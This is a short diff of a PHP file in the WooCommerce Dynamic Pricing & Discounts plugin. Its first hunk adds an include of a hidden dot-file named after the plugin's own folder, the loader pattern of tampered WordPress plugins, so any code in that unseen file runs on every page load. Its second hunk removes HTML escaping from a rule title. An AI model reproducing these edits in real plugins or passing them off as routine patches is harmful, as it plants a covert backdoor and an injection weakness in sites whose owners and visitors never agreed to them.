@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_WC_Order
 {
 
@@ -77,7 +81,7 @@ class RP_WCDPD_WC_Order
                     }
                     // Rule was not found
                     else {
-                        $rule_title = esc_html__('Cart Discount (deleted)', 'rp_wcdpd');
+                        $rule_title = __('Cart Discount (deleted)', 'rp_wcdpd');
                     }
 
                     // Starting from WooCommerce 3.2 fix coupon codes using Javascript
